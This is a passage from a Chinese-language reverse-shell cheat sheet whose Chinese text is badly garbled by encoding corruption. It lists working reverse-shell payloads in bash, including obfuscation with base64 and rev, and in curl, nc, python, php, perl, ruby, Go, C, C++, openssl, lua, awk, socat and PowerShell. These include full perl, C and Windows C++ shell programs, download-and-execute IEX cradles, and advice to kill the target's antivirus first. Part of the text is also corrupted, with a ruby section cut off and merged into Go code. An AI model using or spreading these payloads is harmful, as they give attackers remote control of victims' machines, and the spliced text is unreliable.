64,-d}|{bash,-i}'  \/\/е…¶дёӯзҡ„base64еӯ—з¬ҰжҳҜbash -i >& \/dev\/tcp\/10.10.14.7\/4444 0>&1зҡ„base64еҠ еҜҶ\n```\n\nиҝҳеҸҜд»Ҙеј•з”ідёҖжіў\n\n```\nеҹәзЎҖзҡ„еҸҚеј№жҢҮд»Ө\necho \"bash -i >& \/dev\/tcp\/192.168.43.47\/4444 0>&1\" | bashжҲ‘д»¬жқҘз»ҷе®ғж··ж·ҶдёҖдёӢ\nе…Ҳз»ҷе®ғbase64дёҖдёӢ\nZWNobyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQzLjQ3LzQ0NDQgMD4mMSIgfCBiYXNoз„¶еҗҺеҸҚиҪ¬дёҖдёӢ\noNXYiBCfgISMm4DMgQDN0QzL3QjLzQjL4YTMuITOx8CcjR3L2VGZvAiJ+ASatACazFmYiAyboNWZе°ұиҝҷж ·еҘ—дёҖдёӢпјҢд№ҹеҸҜд»ҘеҶҚеҘ—дёҖеұӮ\necho oNXYiBCfgISMm4DMgQDN0QzL3QjLzQjL4YTMuITOx8CcjR3L2VGZvAiJ+ASatACazFmYiAyboNWZ | rev |base64 -d |bashеҘ—еҸҳйҮҸ\ns=`echo oNXYiBCfgISMm4DMgQDN0QzL3QjLzQjL4YTMuITOx8CcjR3L2VGZvAiJ+ASatACazFmYiAyboNWZ | rev |base64 -d |bash`;$sеҗҺйқўиҝҳеҸҜд»ҘеҘ—еұӮж•°иҝҷжҳҜдёҖз§ҚеҹәзЎҖзҡ„ж–№жі•пјҢиҝҳжңүеҫҲеӨҡеҸҳз§ҚеҸҜд»Ҙ\n```\n\n## curl\n\nжң¬иҙЁдёҠжқҘиҜҙиҝҳжҳҜbashеҸҚеј№пјҢеҸӘдёҚиҝҮз”ЁcurlеҺ»иҝңзЁӢеҒҮйҖ пјҢеңЁдёҖдәӣзү№е®ҡжғ…еҶөдёӢеҸҜд»Ҙз”ЁгҖӮе…Ҳжң¬ең°еҶҷдёҖдёӘshж–Үд»¶пјҢиҝҷйҮҢж–Үд»¶еҗҚеҗҚдёә5555.sh\n\n```\nbash -i >& \/dev\/tcp\/10.10.16.17\/5555 0>&1\n```\n\nз„¶еҗҺдҪҝз”ЁcurlеҺ»иҝңзЁӢеҠ иҪҪпјҲжҸҗеүҚжң¬ең°ејҖеҗҜhttpпјү\n\n```\ncurl 10.10.16.17\/5555.sh|bash\n```\n\nз„¶еҗҺжң¬ең°ејҖеҗҜзӣ‘еҗ¬е°ұиғҪж”¶еҲ°shell\n\n## NatCat(nc)\n\n дёҚеҗҢзүҲжң¬зҡ„ncдёҚдёҖе®ҡж”ҜжҢҒ-eпјҡ\n\n```\nnc -e \/bin\/bash [host] [port]\n```\n\n```\n\/bin\/bash | nc [host] [port]\n```\n\n```\nmknod backpipe p && nc [host] [port] 0<backpipe | \/bin\/bash 1>backpipe\n```\n\n```\nnc  [host] [иҫ“е…Ҙport]  |  \/bin\/bash  |  nc [host] [иҫ“еҮәport]\n```\n\n```\nrm -f \/tmp\/p; mknod \/tmp\/p p && nc [host] [port] 0\/tmp\/\n```\n\nеҪ“ncзүҲжң¬й—®йўҳж—¶пјҡ\n\n```\nrm \/tmp\/f;mkfifo \/tmp\/f;cat \/tmp\/f|\/bin\/sh -i 2>&1|nc [host] [port] >\/tmp\/f\n```\n\n## exec\n\n```\nexec 5<>\/dev\/tcp\/[host]\/[port];cat <&5 | while read line; do $line 2>&5 >&5; done\n```\n\n```bash\nexec 2>&0 0<&196;exec 196<>\/dev\/tcp\/[host]\/[port]; bash <&196 >&196 2>&196\n```\n\n## powercat\n\n[powercat](https:\/\/github.com\/besimorhino\/powercat)жҳҜnetcatзҡ„powershellзүҲжң¬пјҢеҠҹиғҪе…ҚжқҖжҖ§йғҪиҰҒжҜ”netcatеҘҪз”Ёзҡ„еӨҡгҖӮ\n\n```\npowershell -c \"IEX(New-Object System.Net.WebClient).DownloadString('http:\/\/10.10.14.9:8000\/powercat.ps1');powercat -c 10.10.14.9 -p 4444 -e cmd\"\n```\n\n## telnet\n\n```\ntelnet [host] [иҫ“е…Ҙport] | \/bin\/bash | telnet [host] [иҫ“еҮәport]\n```\n\n```\nrm -f \/tmp\/p; mknod \/tmp\/p p && telnet [host] [port] 0\/tmp\/p\n```\n\nncдёҚеҸҜз”ЁжҲ–иҖ…\/dev\/tcpдёҚеҸҜз”Ёж—¶:\n\n```\nmknod backpipe p && telnet [host] [port] 0<backpipe | \/bin\/bash 1>backpipe\n```\n\n## python\n\n```\npython -c \"import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('ip',port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['\/bin\/bash','-i']);\"\n```\n\nи„ҡжң¬пјҡ\n\n```python\n#!\/usr\/bin\/python3\nimport  os\nimport pty\nimport socket\nlhost = \"\"\nlport = 4444\ndef main():\n   s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n   s.connect((lhost, lport))\n   os.dup2(s.fileno(), 0)\n   os.dup2(s.fileno(), 1)\n   os.dup2(s.fileno(), 2)\n   os.putenv(\"HISTFILE\", '\/dev\/null')\n   pty.spawn(\"\/bin\/bash\")\n   #os.remove('\/tmp\/.t.py')\n   s.close()\nif __name__ == \"__main__\":\n   main()\n```\n\n```\npython -c \"exec(\\\"import socket, subprocess;s = socket.socket();s.connect(('ip',port))\\nwhile 1:  proc = subprocess.Popen(s.recv(1024), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE);s.send(proc.stdout.read()+proc.stderr.read())\\\")\"\n```\n\n```\nmsfvenom -f raw -p python\/meterpreter\/reverse_tcp LHOST=ip LPORT=port\nimport base64; exec(base64.b64decode('aW1wb3J0IHNvY2tldCxzdHJ1Y3QKcz1zb2NrZXQuc29ja2V0KDIsMSkKcy5jb25uZWN0KCgnMTkyLjE2OC45MC4xJywxMjM0KSkKbD1zdHJ1Y3QudW5wYWNrKCc+SScscy5yZWN2KDQpKVswXQpkPXMucmVjdig0MDk2KQp3aGlsZSBsZW4oZCkhPWw6CglkKz1zLnJlY3YoNDA5NikKZXhlYyhkLHsncyc6c30pCg=='))\nдёҠйқўйӮЈж®өзҡ„base64и§Јз Ғдёәпјҡ\nimport socket,struct\ns=socket.socket(2,1)\ns.connect(('192.168.90.1',1234))\nl=struct.unpack('>I',s.recv(4))[0]\nd=s.recv(4096)\nwhile len(d)!=l:\n\td+=s.recv(4096)\nexec(d,{'s':s})\n```\n\npythonеҚҮзә§е®ҢзҫҺptyпјҡ\n\n```\npython3 -c 'import pty;pty.spawn(\"bash\")'\n```\n\n## php\n\n```\nphp -r 'exec(\"\/bin\/bash -i >& \/dev\/tcp\/[host]\/[port]\");'\n```\n\n```\nphp -r '$sock=fsockopen(\"[host]\",[port]);exec(\"\/bin\/bash -i <&3 >&3 2>&3\");'\n```\n\nй…ҚеҗҲncдҪҝз”ЁпјҢе…¶д»–зҡ„д№ҹдёҖж ·:\n\n```php\n<?php system(\"rm \/tmp\/f;mkfifo \/tmp\/f;cat \/tmp\/f|\/bin\/sh -i 2>&1|nc [host] [port] >\/tmp\/f\"); ?>\n```\n\n## perl\n\n```perl\nperl -e 'use Socket;$i=\"[host]\";$p=[port];socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"\/bin\/sh -i\");};'\n```\n\nдёҚдҫқиө–\/bin\/sh\n\n```perl\nperl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\"[host]:[port]\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'\n```\n\n```perl\nperl -MIO -e '$c=new IO::Socket::INET(PeerAddr,\"[host]:[port]\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'\n```\n\nе®Ңж•ҙperlеҸҚеј№shellи„ҡжң¬пјҡ\n\n```perl\n#!\/usr\/bin\/perl -w\n# perl-reverse-shell - A Reverse Shell implementation in PERL\nuse strict;\nuse Socket;\nuse FileHandle;\nuse POSIX;\nmy $VERSION = \"1.0\";\n\n# Where to send the reverse shell.  Change these.\nmy $ip = '127.0.0.1';\nmy $port = 1234;\n\n# Options\nmy $daemon = 1;\nmy $auth   = 0; # 0 means authentication is disabled and any\n        # source IP can access the reverse shell\nmy $authorised_client_pattern = qr(^127\\.0\\.0\\.1$);\n\n# Declarations\nmy $global_page = \"\";\nmy $fake_process_name = \"\/usr\/sbin\/apache\";\n\n# Change the process name to be less conspicious\n$0 = \"[httpd]\";\n\n# Authenticate based on source IP address if required\nif (defined($ENV{'REMOTE_ADDR'})) {\n    cgiprint(\"Browser IP address appears to be: $ENV{'REMOTE_ADDR'}\");\n\n    if ($auth) {\n        unless ($ENV{'REMOTE_ADDR'} =~ $authorised_client_pattern) {\n            cgiprint(\"ERROR: Your client isn't authorised to view this page\");\n            cgiexit();\n        }\n    }\n} elsif ($auth) {\n    cgiprint(\"ERROR: Authentication is enabled, but I couldn't determine your IP address.  Denying access\");\n    cgiexit(0);\n}\n\n# Background and dissociate from parent process if required\nif ($daemon) {\n    my $pid = fork();\n    if ($pid) {\n        cgiexit(0); # parent exits\n    }\n\n    setsid();\n    chdir('\/');\n    umask(0);\n}\n\n# Make TCP connection for reverse shell\nsocket(SOCK, PF_INET, SOCK_STREAM, getprotobyname('tcp'));\nif (connect(SOCK, sockaddr_in($port,inet_aton($ip)))) {\n    cgiprint(\"Sent reverse shell to $ip:$port\");\n    cgiprintpage();\n} else {\n    cgiprint(\"Couldn't open reverse shell to $ip:$port: $!\");\n    cgiexit();\n}\n\n# Redirect STDIN, STDOUT and STDERR to the TCP connection\nopen(STDIN, \">&SOCK\");\nopen(STDOUT,\">&SOCK\");\nopen(STDERR,\">&SOCK\");\n$ENV{'HISTFILE'} = '\/dev\/null';\nsystem(\"w;uname -a;id;pwd\");\nexec({\"\/bin\/sh\"} ($fake_process_name, \"-i\"));\n\n# Wrapper around print\nsub cgiprint {\n    my $line = shift;\n    $line .= \"<p>\\n\";\n    $global_page .= $line;\n}\n\n# Wrapper around exit\nsub cgiexit {\n    cgiprintpage();\n    exit 0; # 0 to ensure we don't give a 500 response.\n}\n\n# Form HTTP response using all the messages gathered by cgiprint so far\nsub cgiprintpage {\n    print \"Content-Length: \" . length($global_page) . \"\\r\nConnection: close\\r\nContent-Type: text\\\/html\\r\\n\\r\\n\" . $global_page;\n}\n```\n\n## ruby\n\nдёҚеёёз”Ёпјҡ\n\n```\nruby -rsocket -e'f=TCPSocket.open(\"[host]\",[port]).to_i;exec sprintf(\"\/bin\/sh -i <&%d >&%d 2>&%d\",f,f,f)'\n```\n\nдёҚдҫқиө–\/bin\/bash\n\n```\nruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"[host]\",\"[port]\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'\n```\n\nйҖӮз”ЁWindows\n\n```\nruby -rsocket -e 'c=TCPSock o\n  \/\/ filename: ReverseShell.go\n  package main\n  import (\n      \"net\"       \/\/ requirement to establish a connection\n      \"os\"        \/\/ requirement to call os.Exit()\n      \"os\/exec\"   \/\/ requirement to execute commands against the target system\n  )\n  func main() {\n      \/\/ Connecting back to the attacker\n      \/\/ If it fails, we exit the program\n      conn, err := net.Dial(\"tcp\", \"192.168.0.23:2233\")\n      if err != nil {\n          os.Exit(1)\n      }\n      \/\/ Creating a \/bin\/sh process\n      cmd := exec.Command(\"\/bin\/sh\")\n      \/\/ Connecting stdin and stdout\n      \/\/ to the opened connection\n      cmd.Stdin = conn\n      cmd.Stdout = conn\n      cmd.Stderr = conn\n      \/\/ Run the process\n      cmd.Run()\n  }\n  ```\n\n- зј–иҜ‘жү§иЎҢ\n\n```\n$ go build ReverseShell.go\n$ .\/ReverseShell\n```\n\n- еҫ—еҲ°shell\n\nиҝҳжңүжӣҙдёәе®Ңж•ҙзҡ„зүҲжң¬пјҢиҜҰжғ…еҸҜд»ҘзңӢпјҡhttps:\/\/www.cnblogs.com\/zhangb8042\/articles\/10795123.html\n\n## gcc(c)\n\n- и„ҡжң¬пјҲlinuxзүҲжң¬пјү\n\n  ```c\n  \/\/filename:ReverseShell.c\n  #include <stdio.h>\n  #include <unistd.h>\n  #include <sys\/types.h>\n  #include <sys\/socket.h>\n  #include <arpa\/inet.h>\n  #include <signal.h>\n  #include <dirent.h>\n  #include <sys\/stat.h>\n  \n  int tcp_port = 6666;\n  char *ip = \"192.168.17.129\";\n  \n  void reverse_shell(){\n          int fd;\n          if ( fork() <= 0){\n                  struct sockaddr_in addr;\n                  addr.sin_family = AF_INET;\n                  addr.sin_port = htons(tcp_port);\n                  addr.sin_addr.s_addr = inet_addr(ip);\n  \n                  fd = socket(AF_INET, SOCK_STREAM, 0);\n                  if ( connect(fd, (struct sockaddr*)&addr, sizeof(addr)) ){\n                          exit(0);\n                  }\n  \n                  dup2(fd, 0);\n                  dup2(fd, 1);\n                  dup2(fd, 2);\n                  execve(\"\/bin\/bash\", 0LL, 0LL);\n          }\n          return;\n  }\n  \n  void main(int argc, char const *argv[])\n  {\n          reverse_shell();\n          return 0;\n  }\n  ```\n\n- kaliејҖеҗҜзӣ‘еҗ¬пјҡ\n\n  ```\n  nc -lvvp 6666\n  ```\n\n- gccзј–иҜ‘пјҡ\n\n  ```\n  gcc ReverseShell.c -o ReverseShell\n  ```\n\n- жҲҗеҠҹеҫ—еҲ°shell\n\n## g++(c++)\n\nжӯӨж–№жі•еҸҜиғҪиў«жқҖпјҢдҪҝз”ЁеүҚе…ҲжҹҘзңӢзӣ®ж ҮдёҠжҳҜеҗҰжңүжқҖиҪҜпјҢе…Ҳз»ҷд»–жҠҠд»–еҰҲзҡ„иҝӣзЁӢkillжҺүпјҢtasklistпјҢtaskkill\n\n```c++\n#include <iostream>\n#include <winsock2.h>\n#include <windows.h>\n#include <ws2tcpip.h>\n#include <stdio.h>\n#include <synchapi.h>\nusing namespace std;\n\nSOCKET Winsock;\nWORD wVersionRequested;\nWSADATA wsaData;\nstruct sockaddr_in hax; \/\/ ең°еқҖз»“жһ„\nchar ip_addr[16] = \"*.*.*.*\"; \/\/ ipең°еқҖпјҲжҲ–иҖ…дё»жңәеҗҚпјү\nchar port[6] = \"8888\";              \/\/ з«ҜеҸЈ\n\/\/ жҢҮе®ҡж–°иҝӣзЁӢдё»зӘ—еҸЈзҡ„зү№жҖ§\nSTARTUPINFO ini_processo;\n\n\/\/ иҝ”еӣһжңүе…іж–°иҝӣзЁӢеҸҠе…¶дё»зәҝзЁӢзҡ„дҝЎжҒҜ\nPROCESS_INFORMATION processo_info;\n\nint __cdecl main(){   \n    int err;\n    while(1){\n        err = WSAStartup(MAKEWORD(2, 2), &wsaData);\n        if(err != 0){\n            printf(\"WSAStartup failed with error: %d\\n\", err);\n            return 1;\n        }\n        Winsock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);\n        if(Winsock==INVALID_SOCKET){\n            wprintf(L\"WSASocket function failed with error = %d\\n\", WSAGetLastError() );\n        }\n        else{\n            struct hostent *host; \/\/ й»‘е®ўдё»жңәдҝЎжҒҜ\n            host = gethostbyname(ip_addr);\n            strcpy_s(ip_addr, inet_ntoa(*((struct in_addr *)host->h_addr)));\n            hax.sin_family = AF_INET;\n            hax.sin_port = htons(atoi(port));\n            hax.sin_addr.s_addr = inet_addr(ip_addr);\n            memset(&hax.sin_zero, 0, 8);\n            err = connect(Winsock, (struct sockaddr *)&hax, sizeof(struct sockaddr));\n            if (err == SOCKET_ERROR) {\n                wprintf(L\"connect function failed with error: %ld\\n\", WSAGetLastError());\n                return 1;\n            }else{\n                memset(&ini_processo, 0, sizeof(ini_processo)); \/\/еҲқе§ӢеҢ–з»“жһ„дҪ“\n                ini_processo.cb = sizeof(ini_processo);\n                ini_processo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW; \/\/ йҮҚе®ҡеҗ‘пјҢйҡҗи—ҸзӘ—еҸЈ\n                \/\/ е°Ҷж ҮеҮҶиҫ“е…ҘгҖҒиҫ“еҮәгҖҒй”ҷиҜҜйҮҚе®ҡеҗ‘еҲ°socketеҸҘжҹ„\n                ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError = (HANDLE)Winsock;\n\n                TCHAR cmd[255] = TEXT(\"cmd.exe\");\n\n                CreateProcess(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &ini_processo, &processo_info);\n\n                return 0;\n            }\n            err = closesocket((SOCKET)Winsock);\n            if(err == SOCKET_ERROR){\n                wprintf(L\"closesocket function failed with error: %ld\\n\", WSAGetLastError());\n                WSACleanup();\n                return 1;\n            }\n            WSACleanup();\n            return 0;\n        }\n        Sleep(30000); \/\/дј‘зң 30s\n    }\n    return 0;\n}\n```\n\nдҪҝз”ЁеҰӮдёӢе‘Ҫд»Өзј–иҜ‘пјҡ\n\n```css\ng++ reverse_shell_win.cpp -static -lwsock32 -lws2_32 -o reverse_shell_win.exe\n```\n\nеңЁж”»еҮ»жңәдёҠзӣ‘еҗ¬з«ҜеҸЈ\n\n```undefined\nnc -lvp 8888\n```\n\n## opensslпјҲеҠ еҜҶеҸҚеј№shellпјү\n\nеңЁи®Ўз®—жңәзҪ‘з»ңдёҠпјҢOpenSSL жҳҜдёҖдёӘејҖж”ҫжәҗд»Јз Ғзҡ„иҪҜд»¶еә“еҢ…пјҢеә”з”ЁзЁӢеәҸеҸҜд»ҘдҪҝз”ЁиҝҷдёӘеҢ…жқҘиҝӣиЎҢе®үе…ЁйҖҡдҝЎпјҢйҒҝе…ҚзӘғеҗ¬пјҢеҗҢж—¶зЎ®и®ӨеҸҰдёҖз«ҜиҝһжҺҘиҖ…зҡ„иә«д»ҪгҖӮдёҚеҠ еҜҶе°ұи·ҹиЈёеҘ”дёҖж ·гҖӮ\n\n1. йҰ–е…Ҳз”ҹжҲҗиҮӘзӯҫеҗҚиҜҒд№ҰпјҢиҫ“е…Ҙзҡ„ж—¶еҖҷй»ҳи®ӨеӣһиҪҰеҚіеҸҜпјҡ\n\n   ```\n   openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes\n   ```\n\n   -newkey rsa:2048йҖүйЎ№еЈ°жҳҺдәҶдҪҝз”ЁRASз®—жі•з”ҹжҲҗ2048дҪҚзҡ„з§Ғй’ҘгҖӮ\n   -nodesйҖүйЎ№иЎЁжҳҺжҲ‘д»¬дёҚдҪҝз”ЁеҜҶз ҒеҠ еҜҶз§Ғй’ҘгҖӮ\n   -keyout key.key:з”ҹжҲҗз§Ғй’Ҙ\n   -out cert.pemпјҡз”ҹжҲҗpemиҜҒд№Ұ\n\n2. жңҚеҠЎз«Ҝзӣ‘еҗ¬8888з«ҜеҸЈпјҡ\n\n   ```\n   openssl s_server -quiet -key key.pem -cert cert.pem -port 8888\n   ```\n\n3. LinuxдёӢдҪҝз”ЁmkfifoиҝӣиЎҢеҸҚеј№shell(дҪҝз”ЁopensslеҚ•еҗ‘и®ӨиҜҒ)пјҡ\n\n   ```\n   mkfifo \/tmp\/s; \/bin\/sh -i < \/tmp\/s 2>&1 | openssl s_client -quiet -connect [host]:[port]> \/tmp\/s; rm \/tmp\/s\n   ```\n\nopensslеҚ•\/еҸҢеҗ‘и®ӨиҜҒеҸӮиҖғпјҡhttps:\/\/blog.csdn.net\/go_home_look\/article\/details\/107238103\n\nwindowsдёҚжҺЁиҚҗдҪҝз”ЁжӯӨж–№жі•пјҢе»әи®®зӣҙжҺҘеҶҷwebshellгҖӮеҪ“з„¶WindowsдёӢд№ҹжҳҜеҸҜд»Ҙзҡ„пјҢиҝҷйҮҢеҒҡдёӘеҸӮиҖғпјҡ\n\n1. жңҚеҠЎз«ҜејҖеҗҜдёӨдёӘзӣ‘еҗ¬пјҢд»Һ ip:port1 иҺ·еҸ–е‘Ҫд»ӨеҸ‘йҖҒз»ҷ cmd.exeжү§иЎҢпјҢз„¶еҗҺз»“жһңиҝ”еӣһеҲ° ip:port2гҖӮ\n\n   ```\n   openssl s_server -quiet -key key.pem -cert cert.pem -port [port1]\n   openssl s_server -quiet -key key.pem -cert cert.pem -port [port2]\n   ```\n\n2. е®ўжҲ·з«Ҝжү§иЎҢ\n\n   ```\n   openssl s_client -quiet -connect [host]:[port1] | cmd.exe | openssl s_client -quiet -connect [host]:[port2]\n   ```\n\n3. еңЁжңҚеҠЎз«Ҝзҡ„[port1]зҡ„зӘ—еҸЈеҸ‘йҖҒе‘Ҫд»Ө,з„¶еҗҺжңҚеҠЎз«Ҝ[port2]зҡ„зӘ—еҸЈдјҡж”¶еҲ°жү§иЎҢз»“жһң\n\n## lua\n\n```lua\nlua -e \"require('socket');require('os');t=socket.tcp();t:connect('ip','port');os.execute('\/bin\/sh -i <&3 >&3 2>&3');\"\n```\n\n```lua\nlua -e \"local s=require('socket');local t=assert(s.tcp());t:connect('ip',port);while true do local r,x=t:receive();local f=assert(io.popen(r,'r'));local b=assert(f:read('*a'));t:send(b);end;f:close();t:close();\"\n```\n\n## awk\n\n awkжҳҜдёҖз§ҚеӨ„зҗҶж–Үжң¬ж–Үд»¶зҡ„иҜӯиЁҖпјҢжҳҜдёҖз§Қи§ЈйҮҠеһӢзҡ„зј–зЁӢиҜӯиЁҖпјҢеҸҜд»ҘдҪҝз”ЁawkжқҘеӨ„зҗҶеҸҚеј№зҡ„е‘Ҫд»ӨгҖӮ\n\n[д»Җд№ҲжҳҜawkпјҹ](https:\/\/github.com\/mylxsw\/growing-up\/blob\/master\/doc\/дёүеҚҒеҲҶй’ҹеӯҰдјҡAWK.md)\n\n```\nзӣ‘еҗ¬з«Ҝпјҡ\nnc -nlvp 1231\n```\n\n```\nиў«зӣ‘еҗ¬з«Ҝпјҡ\ncp \/usr\/bin\/awk \/home\/a               \n(еӨҚеҲ¶дёҖдёӘawkпјҢдёҖиҲ¬жғ…еҶөдёӢй»‘е®ўеҰӮжһңеҒҡиҝҷдёҖжӯҘжҳҜдёәдәҶйҳІжӯўиў«жЈҖжөӢпјҢиҝҷдёҖжӯҘеҸҜд»ҘдёҚз”ЁеҒҡпјҢзӣҙжҺҘз”Ёawkжү§иЎҢд№ҹжҳҜеҸҜд»Ҙзҡ„)\n\/home\/a 'BEGIN{s=\"\/inet\/tcp\/0\/[host]\/[port]\"\nпјҲBEGINиҜӯеҸҘеқ—еңЁзЁӢеәҸејҖе§Ӣзҡ„дҪҝз”Ёжү§иЎҢпјҢе®ғеҸӘжү§иЎҢдёҖж¬ЎпјҢBEGINжҳҜawkзҡ„е…ій”®еӯ—пјҢиҝҷдёӘең°ж–№иҝҷжқЎе’ҢдёӢдёҖжқЎиҜӯеҸҘжҳҜжӢҶејҖзҡ„пјҢд№ҹеҸҜд»ҘеҗҲе№¶еңЁдёҖиө·жү§иЎҢпјҢжіЁж„ҸеҗҲеңЁдёҖиө·жү§иЎҢзҡ„иҜқпјҢиҝҷжқЎиҜӯеҸҘеҗҺйқўиҰҒеҠ еҲҶеҸ·пјҢжҜ”еҰӮзңӢдёӢйқўgawkпјҢжҲ‘дјҡеҗҲе№¶жү§иЎҢпјү\nfor(;s|&getline c;close(c))while (c|getline)print|&s;close(s)}'\n(дёҺе…¶д»–Cзі»иҜӯиЁҖдёҖж ·пјҢawkд№ҹжңүforеҫӘзҺҜпјҢgetlineе‘Ҫд»ӨиЎЁзӨәи®©awkиҜ»еҸ–дёӢдёҖиЎҢеҶ…е®№пјҢclose()еҮҪж•°жҳҜеҶ…е»әеҮҪж•°)\n```\n\n## gawk\n\n gawkжҳҜGNUжүҖеҒҡзҡ„awkпјҢд№ӢеҗҺдёҚж–ӯең°жӣҙж–°иҝӯд»ЈпјҢgawk еҢ…еҗ« awk зҡ„жүҖжңүеҠҹиғҪгҖӮ\n\n```\nзӣ‘еҗ¬з«Ҝпјҡ\nnc -nlvp 1231\n```\n\n```\nиў«зӣ‘еҗ¬з«Ҝ:\ngawk 'BEGIN{s=\"\/inet\/tcp\/0\/[host]\/[port]\";for(;s|&getline c;close(c))while(c|getline)print|&s;close(s)}'\n```\n\n## socat\n\n#### tcp\n\nжҺҘж”¶з«Ҝиҫ“е…Ҙпјҡ\n\n```shell\n.\/socat TCP-LISTEN:ip -\n```\n\nеҸ‘йҖҒз«Ҝиҫ“е…Ҙпјҡ\n\n```shell\n.\/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:ip:port\n```\n\n#### udp\n\n```shell\nsocat udp-connect:ж”»еҮ»иҖ…ip:з«ҜеҸЈ exec:'bash -li',pty,stderr,sane 2>&1>\/dev\/null &\n```\n\n## MSF\n\n```\n1.msconsole      з®ЎзҗҶз”ҹжҲҗзҡ„exp  з®ЎзҗҶеҸҚеј№зҡ„shell  йҖҡиҝҮеҸҚеј№зҡ„shellиҝӣиЎҢеҗҺжё—йҖҸгҖӮгҖӮгҖӮгҖӮ\n2.msfvenom       еҲ¶дҪңжңЁй©¬\n3.msfencode      еҜ№жңЁй©¬иҝӣиЎҢзј–з Ғ\n4.Auxiliary      иҫ…еҠ©жЁЎеқ—\n5.meterpreter    иҝһжҺҘ \n```\n\n## Cobalt strike\n\nиҝҷдёӘе°ұдёҚз”ЁеӨҡиҜҙдәҶ\n\n## NishangеҸҚеј№shell\n\n[Nishang](https:\/\/github.com\/samratashok\/nishang )жҳҜдёҖдёӘеҹәдәҺPowerShellзҡ„ж”»еҮ»жЎҶжһ¶пјҢйӣҶеҗҲдәҶдёҖдәӣPowerShellж”»еҮ»и„ҡжң¬е’Ңжңүж•ҲиҪҪиҚ·пјҢеҸҜеҸҚеј№TCP\/ UDP\/ HTTP\/HTTPS\/ ICMPзӯүзұ»еһӢshell\n\n#### Reverse TCP Shell\n\n- ж”»еҮ»жңәпјҡ\n\n```\nnc -lvp [port]\n```\n\n- зӣ®ж Үжңәпјҡ\n\n```powershell\npowershell IEX (New-Object Net.WebClient).DownloadString('https:\/\/raw.githubusercontent.com\n\/samratashok\/nishang\/9a3c747bcf535ef82dc4c5c66aac36db47c2afde\/Shells\/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress [hots] -port [port]\n```\n\nжҲ–иҖ…е°ҶnishangдёӢиҪҪеҲ°ж”»еҮ»иҖ…жң¬ең°з„¶еҗҺж”»еҮ»иҖ…ејҖдёҖдёӘhttpжңҚеҠЎпјҡ\n\n```powershell\npowershell IEX (New-Object Net.WebClient).DownloadString('http:\/\/[host]\/nishang\/Shells\/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress [host] -port [port]\n```\n\n#### Reverse UDP Shell\n\n- ж”»еҮ»иҖ…ејҖеҗҜзӣ‘еҗ¬пјҡ\n\n  ```\n  nc -lvup [port]\n  ```\n\n- зӣ®ж Үжңәпјҡ\n\n  ```powershell\n  powershell IEX (New-Object Net.WebClient).DownloadString('http:\/\/[host]\/nishang\/Shells\/Invoke-PowerShellUdp.ps1');\n  Invoke-PowerShellUdp -Reverse -IPAddress [host] -port [port]\n  ```\n\n#### Reverse ICMP Shell\n\nйңҖиҰҒеҲ©з”Ё[icmpsh_m.py](https:\/\/github.com\/inquisb\/icmpsh)е’Ңnishangдёӯзҡ„Invoke-PowerShellIcmp.ps1 жқҘеҸҚеј№ICMP shellгҖӮ\n\n- йҰ–е…Ҳж”»еҮ»з«ҜдёӢиҪҪicmpsh_m.pyж–Үд»¶\n\n  ```\n  icmpsh_m.py Usageпјҡ\n  python icmpsh_m.py [Attacker IP] [Victim IP]\n  ```\n\n- ж”»еҮ»иҖ…жү§иЎҢпјҡ\n\n  ```\n  sysctl -w net.ipv4.icmp_echo_ignore_all=1 #еҝҪз•ҘжүҖжңүicmpеҢ…\n  python icmpsh_m.py [Attacker IP] [Victim IP] #ејҖеҗҜзӣ‘еҗ¬\n  ```\n\n- зӣ®ж Үжңәжү§иЎҢпјҡ\n\n  ```powershell\n  powershell IEX (New-Object Net.WebClient).DownloadString('http:\/\/[host]\/nishang\/Shells\/Invoke-PowerShellIcmp.ps1');Invoke-PowerShellIcmp -IPAddress [host]\n  ```\n\n## иҮӘе®ҡд№үpowershellеҮҪж•°еҸҚеј№shell\n\n- ж”»еҮ»жңәпјҡ\n\n  ```\n  nc -lvp [port]\n  ```\n\n- зӣ®ж Үжңәпјҡ\n\n  ```powershell\n  powershell -nop -c \"$client = New-Object Net.Sockets.TCPClient('[host]',[port]);$stream = $client.GetStream();\n  [byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;\n  $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );\n  $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);\n  $stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"\n  ```\n\n  жҲ–иҖ…дҝқеӯҳдёәlltest_tcp.ps1ж–Үд»¶\n\n  ```powershell\n  powershell IEX (New-Object Net.WebClient).DownloadString('http:\/\/[host]\/lltest_tcp.ps1');Invoke-lltestTcp\n  ```\n\n  lltest_tcp.ps1 еҰӮдёӢпјҡ\n\n  ```powershell\n  function Invoke-lltestTcp\n  {\n  $client = New-Object Net.Sockets.TCPClient('[host]',[port])\n  $stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0}\n  while(($i = $stream.Read($bytes, 